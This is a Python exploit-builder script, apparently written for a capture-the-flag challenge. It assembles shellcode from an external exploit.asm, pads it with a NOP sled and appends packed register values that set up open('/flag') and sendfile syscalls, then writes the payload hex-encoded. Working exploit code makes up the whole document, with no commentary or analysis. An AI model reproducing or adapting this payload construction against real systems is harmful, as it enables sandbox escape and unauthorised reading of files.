#!/usr/bin/env python


import subprocess
import os
import sys
import binascii
import struct

def p64(v):
    return struct.pack("<Q", v)

PIPE = subprocess.PIPE

BASECODEP = 0xfbf
FULLHANDLERSIZE = 0x10000


def rmf(fname):
    try:
        os.unlink(fname)
    except OSError:
        pass


rmf("exploit.o")
rmf("exploit.bin")
p = subprocess.Popen("nasm -f elf64 -o exploit.o exploit.asm".split(), stdout=PIPE, stderr=PIPE)
res = p.communicate()
print(res[0].decode("utf-8"))
print(res[1].decode("utf-8"))
assert len(res[1])==0
p = subprocess.Popen("objcopy -O binary exploit.o exploit.bin".split(), stdout=PIPE, stderr=PIPE)
print(p.communicate())
with open("exploit.bin", "rb") as fp:
    cc = fp.read()


tstr = b"\xf1"
tstr += cc

print("="*3, len(tstr), hex(len(tstr)), hex(len(tstr)+BASECODEP+0x9), hex(0x1000-(len(tstr)+0x9)))

assert(len(tstr)+BASECODEP+0x9 <= 0x1000)

tstr += b"\x90"*(0x1000 - (len(tstr)+BASECODEP+0x9))
tstr += b"\x00"*0x100


tstr += p64(FULLHANDLERSIZE) #rbx
tstr += p64(0x10000000000000000 - 0x1000) #rdx
tstr += p64(0x100000000000) #rdi

tstr += p64(0x192)

tstr += b"/flag\x00".ljust(8,b"\x00") #pointed value
tstr += p64(0) #rsi
tstr += p64(0x1ff) #rdx
tstr += p64(2) #open #rax
tstr += p64(0x2a) #just after jmp _after_rdi_pointer #offset to return 



tstr += p64(1) #rdi
tstr += p64(0xff) #dummy
tstr += p64(4) #rsi
tstr += p64(0) #rdx
tstr += p64(40) #senfile #rax
tstr += p64(112277) #?


with open(sys.argv[1], "wb") as fp:
    fp.write(binascii.hexlify(tstr)+b"\n")


